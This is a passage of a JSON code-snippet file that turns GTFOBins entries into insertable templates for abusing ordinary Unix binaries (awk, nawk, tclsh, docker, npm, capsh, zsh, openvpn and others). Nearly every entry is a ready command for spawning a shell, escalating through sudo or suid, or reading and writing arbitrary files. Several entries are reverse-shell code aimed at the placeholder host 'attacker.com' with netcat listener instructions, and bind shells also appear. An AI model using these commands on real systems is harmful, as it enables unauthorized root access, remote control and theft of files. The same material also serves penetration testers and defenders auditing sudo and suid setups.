        "description": "abuse genisoimage with file-read"
    },
    "genisoimage suid (gtfobins)": {
        "prefix": "genisoimage suid",
        "body": [
            "abuse genisoimage with suid, The file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./genisoimage -sort \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse genisoimage with suid - The file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data."
    },
    "genisoimage sudo (gtfobins)": {
        "prefix": "genisoimage sudo",
        "body": [
            "abuse genisoimage with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo genisoimage -q -o - \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse genisoimage with sudo"
    },
    "facter shell (gtfobins)": {
        "prefix": "facter shell",
        "body": [
            "abuse facter with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'exec(\"/bin/sh\")' > \\$TF/x.rb",
            "FACTERLIB=\\$TF facter${0}",
            "```"
        ],
        "description": "abuse facter with shell"
    },
    "facter sudo (gtfobins)": {
        "prefix": "facter sudo",
        "body": [
            "abuse facter with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'exec(\"/bin/sh\")' > \\$TF/x.rb",
            "sudo FACTERLIB=\\$TF facter${0}",
            "```"
        ],
        "description": "abuse facter with sudo"
    },
    "wall sudo (gtfobins)": {
        "prefix": "wall sudo",
        "body": [
            "abuse wall with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo wall --nobanner \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse wall with sudo"
    },
    "timeout shell (gtfobins)": {
        "prefix": "timeout shell",
        "body": [
            "abuse timeout with shell",
            "",
            "```sh",
            "timeout 7d /bin/sh${0}",
            "```"
        ],
        "description": "abuse timeout with shell"
    },
    "timeout suid (gtfobins)": {
        "prefix": "timeout suid",
        "body": [
            "abuse timeout with suid",
            "",
            "```sh",
            "./timeout 7d /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse timeout with suid"
    },
    "timeout sudo (gtfobins)": {
        "prefix": "timeout sudo",
        "body": [
            "abuse timeout with sudo",
            "",
            "```sh",
            "sudo timeout --foreground 7d /bin/sh${0}",
            "```"
        ],
        "description": "abuse timeout with sudo"
    },
    "taskset shell (gtfobins)": {
        "prefix": "taskset shell",
        "body": [
            "abuse taskset with shell",
            "",
            "```sh",
            "taskset 1 /bin/sh${0}",
            "```"
        ],
        "description": "abuse taskset with shell"
    },
    "taskset suid (gtfobins)": {
        "prefix": "taskset suid",
        "body": [
            "abuse taskset with suid",
            "",
            "```sh",
            "./taskset 1 /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse taskset with suid"
    },
    "taskset sudo (gtfobins)": {
        "prefix": "taskset sudo",
        "body": [
            "abuse taskset with sudo",
            "",
            "```sh",
            "sudo taskset 1 /bin/sh${0}",
            "```"
        ],
        "description": "abuse taskset with sudo"
    },
    "bridge file-read (gtfobins)": {
        "prefix": "bridge file-read",
        "body": [
            "abuse bridge with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "bridge -b \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse bridge with file-read"
    },
    "bridge suid (gtfobins)": {
        "prefix": "bridge suid",
        "body": [
            "abuse bridge with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./bridge -b \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse bridge with suid"
    },
    "bridge sudo (gtfobins)": {
        "prefix": "bridge sudo",
        "body": [
            "abuse bridge with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo bridge -b \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse bridge with sudo"
    },
    "ntpdate file-read (gtfobins)": {
        "prefix": "ntpdate file-read",
        "body": [
            "abuse ntpdate with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ntpdate -a x -k \\$LFILE -d localhost${0}",
            "```"
        ],
        "description": "abuse ntpdate with file-read"
    },
    "ntpdate sudo (gtfobins)": {
        "prefix": "ntpdate sudo",
        "body": [
            "abuse ntpdate with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo ntpdate -a x -k \\$LFILE -d localhost${0}",
            "```"
        ],
        "description": "abuse ntpdate with sudo"
    },
    "ntpdate suid (gtfobins)": {
        "prefix": "ntpdate suid",
        "body": [
            "abuse ntpdate with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./ntpdate -a x -k \\$LFILE -d localhost${0}",
            "```"
        ],
        "description": "abuse ntpdate with suid"
    },
    "ssh-keyscan file-read (gtfobins)": {
        "prefix": "ssh-keyscan file-read",
        "body": [
            "abuse ssh-keyscan with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ssh-keyscan -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse ssh-keyscan with file-read"
    },
    "ssh-keyscan suid (gtfobins)": {
        "prefix": "ssh-keyscan suid",
        "body": [
            "abuse ssh-keyscan with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./ssh-keyscan -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse ssh-keyscan with suid"
    },
    "ssh-keyscan sudo (gtfobins)": {
        "prefix": "ssh-keyscan sudo",
        "body": [
            "abuse ssh-keyscan with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo ssh-keyscan -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse ssh-keyscan with sudo"
    },
    "nawk shell (gtfobins)": {
        "prefix": "nawk shell",
        "body": [
            "abuse nawk with shell",
            "",
            "```sh",
            "nawk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse nawk with shell"
    },
    "nawk non-interactive-reverse-shell (gtfobins)": {
        "prefix": "nawk non-interactive-reverse-shell",
        "body": [
            "abuse nawk with non-interactive-reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "nawk -v RHOST=\\$RHOST -v RPORT=\\$RPORT 'BEGIN {",
            "    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;",
            "    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;",
            "    while (c && (c |& getline) > 0) print \\$0 |& s; close(c)}}'${0}",
            "```"
        ],
        "description": "abuse nawk with non-interactive-reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "nawk non-interactive-bind-shell (gtfobins)": {
        "prefix": "nawk non-interactive-bind-shell",
        "body": [
            "abuse nawk with non-interactive-bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell.",
            "",
            "```sh",
            "LPORT=${1:12345}",
            "nawk -v LPORT=\\$LPORT 'BEGIN {",
            "    s = \"/inet/tcp/\" LPORT \"/0/0\";",
            "    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;",
            "    while (c && (c |& getline) > 0) print \\$0 |& s; close(c)}}'${0}",
            "```"
        ],
        "description": "abuse nawk with non-interactive-bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell."
    },
    "nawk file-write (gtfobins)": {
        "prefix": "nawk file-write",
        "body": [
            "abuse nawk with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "nawk -v LFILE=\\$LFILE 'BEGIN { print \"DATA\" > LFILE }'${0}",
            "```"
        ],
        "description": "abuse nawk with file-write"
    },
    "nawk file-read (gtfobins)": {
        "prefix": "nawk file-read",
        "body": [
            "abuse nawk with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "nawk '//' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse nawk with file-read"
    },
    "nawk suid (gtfobins)": {
        "prefix": "nawk suid",
        "body": [
            "abuse nawk with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./nawk '//' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse nawk with suid"
    },
    "nawk sudo (gtfobins)": {
        "prefix": "nawk sudo",
        "body": [
            "abuse nawk with sudo",
            "",
            "```sh",
            "sudo nawk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse nawk with sudo"
    },
    "nawk limited-suid (gtfobins)": {
        "prefix": "nawk limited-suid",
        "body": [
            "abuse nawk with limited-suid",
            "",
            "```sh",
            "./nawk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse nawk with limited-suid"
    },
    "pdb shell (gtfobins)": {
        "prefix": "pdb shell",
        "body": [
            "abuse pdb with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'import os; os.system(\"/bin/sh\")' > \\$TF",
            "pdb \\$TF",
            "cont${0}",
            "```"
        ],
        "description": "abuse pdb with shell"
    },
    "pdb sudo (gtfobins)": {
        "prefix": "pdb sudo",
        "body": [
            "abuse pdb with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'import os; os.system(\"/bin/sh\")' > \\$TF",
            "sudo pdb \\$TF",
            "cont${0}",
            "```"
        ],
        "description": "abuse pdb with sudo"
    },
    "red file-write (gtfobins)": {
        "prefix": "red file-write",
        "body": [
            "abuse red with file-write",
            "",
            "```sh",
            "red ${1:file_to_write}",
            "a",
            "DATA",
            ".",
            "w",
            "q${0}",
            "```"
        ],
        "description": "abuse red with file-write"
    },
    "red file-read (gtfobins)": {
        "prefix": "red file-read",
        "body": [
            "abuse red with file-read",
            "",
            "```sh",
            "red ${1:file_to_read}",
            ",p",
            "q${0}",
            "```"
        ],
        "description": "abuse red with file-read"
    },
    "red sudo (gtfobins)": {
        "prefix": "red sudo",
        "body": [
            "abuse red with sudo",
            "",
            "```sh",
            "sudo red ${1:file_to_write}",
            "a",
            "DATA",
            ".",
            "w",
            "q${0}",
            "```"
        ],
        "description": "abuse red with sudo"
    },
    "ghc shell (gtfobins)": {
        "prefix": "ghc shell",
        "body": [
            "abuse ghc with shell",
            "",
            "```sh",
            "ghc -e 'System.Process.callCommand \"/bin/sh\"'${0}",
            "```"
        ],
        "description": "abuse ghc with shell"
    },
    "ghc sudo (gtfobins)": {
        "prefix": "ghc sudo",
        "body": [
            "abuse ghc with sudo",
            "",
            "```sh",
            "sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'${0}",
            "```"
        ],
        "description": "abuse ghc with sudo"
    },
    "c89 file-read (gtfobins)": {
        "prefix": "c89 file-read",
        "body": [
            "abuse c89 with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "c89 -x c -E \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse c89 with file-read"
    },
    "c89 file-write (gtfobins)": {
        "prefix": "c89 file-write",
        "body": [
            "abuse c89 with file-write",
            "",
            "```sh",
            "LFILE=file_to_delete",
            "c89 -xc /dev/null -o \\$LFILE${0}",
            "```"
        ],
        "description": "abuse c89 with file-write"
    },
    "c89 shell (gtfobins)": {
        "prefix": "c89 shell",
        "body": [
            "abuse c89 with shell",
            "",
            "```sh",
            "c89 -wrapper /bin/sh,-s .${0}",
            "```"
        ],
        "description": "abuse c89 with shell"
    },
    "c89 sudo (gtfobins)": {
        "prefix": "c89 sudo",
        "body": [
            "abuse c89 with sudo",
            "",
            "```sh",
            "sudo c89 -wrapper /bin/sh,-s .${0}",
            "```"
        ],
        "description": "abuse c89 with sudo"
    },
    "capsh shell (gtfobins)": {
        "prefix": "capsh shell",
        "body": [
            "abuse capsh with shell",
            "",
            "```sh",
            "capsh --${0}",
            "```"
        ],
        "description": "abuse capsh with shell"
    },
    "capsh suid (gtfobins)": {
        "prefix": "capsh suid",
        "body": [
            "abuse capsh with suid",
            "",
            "```sh",
            "./capsh --gid=0 --uid=0 --${0}",
            "```"
        ],
        "description": "abuse capsh with suid"
    },
    "capsh sudo (gtfobins)": {
        "prefix": "capsh sudo",
        "body": [
            "abuse capsh with sudo",
            "",
            "```sh",
            "sudo capsh --${0}",
            "```"
        ],
        "description": "abuse capsh with sudo"
    },
    "npm shell (gtfobins)": {
        "prefix": "npm shell",
        "body": [
            "abuse npm with shell, Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > \\$TF/package.json",
            "npm -C \\$TF i${0}",
            "```"
        ],
        "description": "abuse npm with shell - Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`."
    },
    "npm sudo (gtfobins)": {
        "prefix": "npm sudo",
        "body": [
            "abuse npm with sudo, Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > \\$TF/package.json",
            "sudo npm -C \\$TF --unsafe-perm i${0}",
            "```"
        ],
        "description": "abuse npm with sudo - Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`."
    },
    "docker shell (gtfobins)": {
        "prefix": "docker shell",
        "body": [
            "abuse docker with shell, The resulting is a root shell.",
            "",
            "```sh",
            "docker run -v /:/mnt --rm -it alpine chroot /mnt sh${0}",
            "```"
        ],
        "description": "abuse docker with shell - The resulting is a root shell."
    },
    "docker file-write (gtfobins)": {
        "prefix": "docker file-write",
        "body": [
            "abuse docker with file-write, Write a file by copying it to a temporary container and back to the target destination on the host.",
            "",
            "```sh",
            "CONTAINER_ID=\"\\$(docker run -d alpine)\" # or existing",
            "TF=\\$(mktemp)",
            "echo \"DATA\" > \\$TF",
            "docker cp \\$TF \\$CONTAINER_ID:\\$TF",
            "docker cp \\$CONTAINER_ID:\\$TF ${1:file_to_write}${0}",
            "```"
        ],
        "description": "abuse docker with file-write - Write a file by copying it to a temporary container and back to the target destination on the host."
    },
    "docker file-read (gtfobins)": {
        "prefix": "docker file-read",
        "body": [
            "abuse docker with file-read, Read a file by copying it to a temporary container and back to a new location on the host.",
            "",
            "```sh",
            "CONTAINER_ID=\"\\$(docker run -d alpine)\"  # or existing",
            "TF=\\$(mktemp)",
            "docker cp ${1:file_to_read} \\$CONTAINER_ID:\\$TF",
            "docker cp \\$CONTAINER_ID:\\$TF \\$TF",
            "cat \\$TF${0}",
            "```"
        ],
        "description": "abuse docker with file-read - Read a file by copying it to a temporary container and back to a new location on the host."
    },
    "docker sudo (gtfobins)": {
        "prefix": "docker sudo",
        "body": [
            "abuse docker with sudo, The resulting is a root shell.",
            "",
            "```sh",
            "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh${0}",
            "```"
        ],
        "description": "abuse docker with sudo - The resulting is a root shell."
    },
    "docker suid (gtfobins)": {
        "prefix": "docker suid",
        "body": [
            "abuse docker with suid, The resulting is a root shell.",
            "",
            "```sh",
            "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh${0}",
            "```"
        ],
        "description": "abuse docker with suid - The resulting is a root shell."
    },
    "aws shell (gtfobins)": {
        "prefix": "aws shell",
        "body": [
            "abuse aws with shell, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "aws help",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse aws with shell - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "aws sudo (gtfobins)": {
        "prefix": "aws sudo",
        "body": [
            "abuse aws with sudo, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "sudo aws help",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse aws with sudo - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "tclsh shell (gtfobins)": {
        "prefix": "tclsh shell",
        "body": [
            "abuse tclsh with shell",
            "",
            "```sh",
            "tclsh",
            "exec /bin/sh <@stdin >@stdout 2>@stderr${0}",
            "```"
        ],
        "description": "abuse tclsh with shell"
    },
    "tclsh non-interactive-reverse-shell (gtfobins)": {
        "prefix": "tclsh non-interactive-reverse-shell",
        "body": [
            "abuse tclsh with non-interactive-reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "echo 'set s [socket \\$::env(RHOST) \\$::env(RPORT)];while 1 { puts -nonewline \\$s \"> \";flush \\$s;gets \\$s c;set e \"exec \\$c\";if {![catch {set r [eval \\$e]} err]} { puts \\$s \\$r }; flush \\$s; }; close \\$s;' | tclsh${0}",
            "```"
        ],
        "description": "abuse tclsh with non-interactive-reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "tclsh suid (gtfobins)": {
        "prefix": "tclsh suid",
        "body": [
            "abuse tclsh with suid",
            "",
            "```sh",
            "./tclsh",
            "exec /bin/sh -p <@stdin >@stdout 2>@stderr${0}",
            "```"
        ],
        "description": "abuse tclsh with suid"
    },
    "tclsh sudo (gtfobins)": {
        "prefix": "tclsh sudo",
        "body": [
            "abuse tclsh with sudo",
            "",
            "```sh",
            "sudo tclsh",
            "exec /bin/sh <@stdin >@stdout 2>@stderr${0}",
            "```"
        ],
        "description": "abuse tclsh with sudo"
    },
    "dash shell (gtfobins)": {
        "prefix": "dash shell",
        "body": [
            "abuse dash with shell",
            "",
            "```sh",
            "dash${0}",
            "```"
        ],
        "description": "abuse dash with shell"
    },
    "dash file-write (gtfobins)": {
        "prefix": "dash file-write",
        "body": [
            "abuse dash with file-write",
            "",
            "```sh",
            "export LFILE=${1:file_to_write}",
            "dash -c 'echo DATA > \\$LFILE'${0}",
            "```"
        ],
        "description": "abuse dash with file-write"
    },
    "dash suid (gtfobins)": {
        "prefix": "dash suid",
        "body": [
            "abuse dash with suid",
            "",
            "```sh",
            "./dash -p${0}",
            "```"
        ],
        "description": "abuse dash with suid"
    },
    "dash sudo (gtfobins)": {
        "prefix": "dash sudo",
        "body": [
            "abuse dash with sudo",
            "",
            "```sh",
            "sudo dash${0}",
            "```"
        ],
        "description": "abuse dash with sudo"
    },
    "zsh file-read (gtfobins)": {
        "prefix": "zsh file-read",
        "body": [
            "abuse zsh with file-read",
            "",
            "```sh",
            "export LFILE=${1:file_to_read}",
            "zsh -c 'echo \"\\$(<\\$LFILE)\"'${0}",
            "```"
        ],
        "description": "abuse zsh with file-read"
    },
    "zsh file-write (gtfobins)": {
        "prefix": "zsh file-write",
        "body": [
            "abuse zsh with file-write",
            "",
            "```sh",
            "export LFILE=${1:file_to_write}",
            "zsh -c 'echo DATA >\\$LFILE'${0}",
            "```"
        ],
        "description": "abuse zsh with file-write"
    },
    "zsh shell (gtfobins)": {
        "prefix": "zsh shell",
        "body": [
            "abuse zsh with shell",
            "",
            "```sh",
            "zsh${0}",
            "```"
        ],
        "description": "abuse zsh with shell"
    },
    "zsh suid (gtfobins)": {
        "prefix": "zsh suid",
        "body": [
            "abuse zsh with suid",
            "",
            "```sh",
            "./zsh${0}",
            "```"
        ],
        "description": "abuse zsh with suid"
    },
    "zsh sudo (gtfobins)": {
        "prefix": "zsh sudo",
        "body": [
            "abuse zsh with sudo",
            "",
            "```sh",
            "sudo zsh${0}",
            "```"
        ],
        "description": "abuse zsh with sudo"
    },
    "join file-read (gtfobins)": {
        "prefix": "join file-read",
        "body": [
            "abuse join with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "join -a 2 /dev/null \\$LFILE${0}",
            "```"
        ],
        "description": "abuse join with file-read"
    },
    "join suid (gtfobins)": {
        "prefix": "join suid",
        "body": [
            "abuse join with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./join -a 2 /dev/null \\$LFILE${0}",
            "```"
        ],
        "description": "abuse join with suid"
    },
    "join sudo (gtfobins)": {
        "prefix": "join sudo",
        "body": [
            "abuse join with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo join -a 2 /dev/null \\$LFILE${0}",
            "```"
        ],
        "description": "abuse join with sudo"
    },
    "at shell (gtfobins)": {
        "prefix": "at shell",
        "body": [
            "abuse at with shell",
            "",
            "```sh",
            "echo \"/bin/sh <\\$(tty) >\\$(tty) 2>\\$(tty)\" | at now; tail -f /dev/null${0}",
            "```"
        ],
        "description": "abuse at with shell"
    },
    "at command (gtfobins)": {
        "prefix": "at command",
        "body": [
            "abuse at with command, The invocation will be blind, but it is possible to redirect the output to a file in a readable location.",
            "",
            "```sh",
            "COMMAND=id",
            "echo \"\\$COMMAND\" | at now${0}",
            "```"
        ],
        "description": "abuse at with command - The invocation will be blind, but it is possible to redirect the output to a file in a readable location."
    },
    "at sudo (gtfobins)": {
        "prefix": "at sudo",
        "body": [
            "abuse at with sudo",
            "",
            "```sh",
            "echo \"/bin/sh <\\$(tty) >\\$(tty) 2>\\$(tty)\" | sudo at now; tail -f /dev/null${0}",
            "```"
        ],
        "description": "abuse at with sudo"
    },
    "vagrant shell (gtfobins)": {
        "prefix": "vagrant shell",
        "body": [
            "abuse vagrant with shell",
            "",
            "```sh",
            "cd \\$(mktemp -d)",
            "echo 'exec \"/bin/sh\"' > Vagrantfile",
            "vagrant up${0}",
            "```"
        ],
        "description": "abuse vagrant with shell"
    },
    "vagrant sudo (gtfobins)": {
        "prefix": "vagrant sudo",
        "body": [
            "abuse vagrant with sudo",
            "",
            "```sh",
            "cd \\$(mktemp -d)",
            "echo 'exec \"/bin/sh\"' > Vagrantfile",
            "vagrant up${0}",
            "```"
        ],
        "description": "abuse vagrant with sudo"
    },
    "vagrant suid (gtfobins)": {
        "prefix": "vagrant suid",
        "body": [
            "abuse vagrant with suid",
            "",
            "```sh",
            "cd \\$(mktemp -d)",
            "echo 'exec \"/bin/sh -p\"' > Vagrantfile",
            "vagrant up${0}",
            "```"
        ],
        "description": "abuse vagrant with suid"
    },
    "su sudo (gtfobins)": {
        "prefix": "su sudo",
        "body": [
            "abuse su with sudo",
            "",
            "```sh",
            "sudo su${0}",
            "```"
        ],
        "description": "abuse su with sudo"
    },
    "w3m file-read (gtfobins)": {
        "prefix": "w3m file-read",
        "body": [
            "abuse w3m with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "w3m \"\\$LFILE\" -dump${0}",
            "```"
        ],
        "description": "abuse w3m with file-read"
    },
    "w3m suid (gtfobins)": {
        "prefix": "w3m suid",
        "body": [
            "abuse w3m with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./w3m \"\\$LFILE\" -dump${0}",
            "```"
        ],
        "description": "abuse w3m with suid"
    },
    "w3m sudo (gtfobins)": {
        "prefix": "w3m sudo",
        "body": [
            "abuse w3m with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo w3m \"\\$LFILE\" -dump${0}",
            "```"
        ],
        "description": "abuse w3m with sudo"
    },
    "pexec shell (gtfobins)": {
        "prefix": "pexec shell",
        "body": [
            "abuse pexec with shell",
            "",
            "```sh",
            "pexec /bin/sh${0}",
            "```"
        ],
        "description": "abuse pexec with shell"
    },
    "pexec suid (gtfobins)": {
        "prefix": "pexec suid",
        "body": [
            "abuse pexec with suid",
            "",
            "```sh",
            "./pexec /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse pexec with suid"
    },
    "pexec sudo (gtfobins)": {
        "prefix": "pexec sudo",
        "body": [
            "abuse pexec with sudo",
            "",
            "```sh",
            "sudo pexec /bin/sh${0}",
            "```"
        ],
        "description": "abuse pexec with sudo"
    },
    "top shell (gtfobins)": {
        "prefix": "top shell",
        "body": [
            "abuse top with shell",
            "",
            "```sh",
            "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc",
            "top",
            "# press return twice",
            "reset${0}",
            "```"
        ],
        "description": "abuse top with shell"
    },
    "top sudo (gtfobins)": {
        "prefix": "top sudo",
        "body": [
            "abuse top with sudo, This requires that the root configuration file is writable and might be used to persist elevated privileges.",
            "",
            "```sh",
            "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc",
            "sudo top",
            "# press return twice",
            "reset${0}",
            "```"
        ],
        "description": "abuse top with sudo - This requires that the root configuration file is writable and might be used to persist elevated privileges."
    },
    "openvpn shell (gtfobins)": {
        "prefix": "openvpn shell",
        "body": [
            "abuse openvpn with shell",
            "",
            "```sh",
            "openvpn --dev null --script-security 2 --up '/bin/sh -c sh'${0}",
            "```"
        ],
        "description": "abuse openvpn with shell"
    },
    "openvpn file-read (gtfobins)": {
        "prefix": "openvpn file-read",
        "body": [
            "abuse openvpn with file-read, The file is actually parsed and the first partial wrong line is returned in an error message.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "openvpn --config \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse openvpn with file-read - The file is actually parsed and the first partial wrong line is returned in an error message."
    },
    "openvpn suid (gtfobins)": {
        "prefix": "openvpn suid",
        "body": [
            "abuse openvpn with suid, The file is actually parsed and the first partial wrong line is returned in an error message.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./openvpn --config \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse openvpn with suid - The file is actually parsed and the first partial wrong line is returned in an error message."
    },
    "openvpn sudo (gtfobins)": {
        "prefix": "openvpn sudo",
        "body": [
            "abuse openvpn with sudo, The file is actually parsed and the first partial wrong line is returned in an error message.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo openvpn --config \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse openvpn with sudo - The file is actually parsed and the first partial wrong line is returned in an error message."
    },
    "awk shell (gtfobins)": {
        "prefix": "awk shell",
        "body": [
            "abuse awk with shell",
            "",
            "```sh",
            "awk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse awk with shell"
    },
    "awk non-interactive-reverse-shell (gtfobins)": {
        "prefix": "awk non-interactive-reverse-shell",
        "body": [
            "abuse awk with non-interactive-reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "awk -v RHOST=\\$RHOST -v RPORT=\\$RPORT 'BEGIN {",
            "    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;",
            "    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;",
            "    while (c && (c |& getline) > 0) print \\$0 |& s; close(c)}}'${0}",
            "```"
        ],
        "description": "abuse awk with non-interactive-reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "awk non-interactive-bind-shell (gtfobins)": {
        "prefix": "awk non-interactive-bind-shell",
        "body": [
            "abuse awk with non-interactive-bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell.",
            "",
            "```sh",
            "LPORT=${1:12345}",
            "awk -v LPORT=\\$LPORT 'BEGIN {",
            "    s = \"/inet/tcp/\" LPORT \"/0/0\";",
            "    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;",
            "    while (c && (c |& getline) > 0) print \\$0 |& s; close(c)}}'${0}",
            "```"
        ],
        "description": "abuse awk with non-interactive-bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell."
    },
    "awk file-write (gtfobins)": {
        "prefix": "awk file-write",
        "body": [
            "abuse awk with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "awk -v LFILE=\\$LFILE 'BEGIN { print \"DATA\" > LFILE }'${0}",
            "```"
        ],
        "description": "abuse awk with file-write"
    },
    "awk file-read (gtfobins)": {
        "prefix": "awk file-read",
        "body": [
            "abuse awk with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "awk '//' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse awk with file-read"
    },
    "awk suid (gtfobins)": {
        "prefix": "awk suid",
        "body": [
            "abuse awk with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./awk '//' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse awk with suid"
    },
    "awk sudo (gtfobins)": {
        "prefix": "awk sudo",
        "body": [
            "abuse awk with sudo",
            "",
            "```sh",
            "sudo awk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse awk with sudo"
    },
    "awk limited-suid (gtfobins)": {
        "prefix": "awk limited-suid",
        "body": [
            "abuse awk with limited-suid",
            "",
            "```sh",
            "./awk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse awk with limited-suid"
    },
    "gcloud shell (gtfobins)": {
        "prefix": "gcloud shell",
        "body": [
            "abuse gcloud with shell, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "gcloud help",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse gcloud with shell - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "gcloud sudo (gtfobins)": {
        "prefix": "gcloud sudo",
        "body": [
            "abuse gcloud with sudo, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "sudo gcloud help",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse gcloud with sudo - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "arj file-read (gtfobins)": {
        "prefix": "arj file-read",
        "body": [
            "abuse arj with file-read, The file appears amid some other textual information. The archive can also be downloaded then extracted offline.",
            "",
            "```sh",
            "TF=\\$(mktemp -u)",
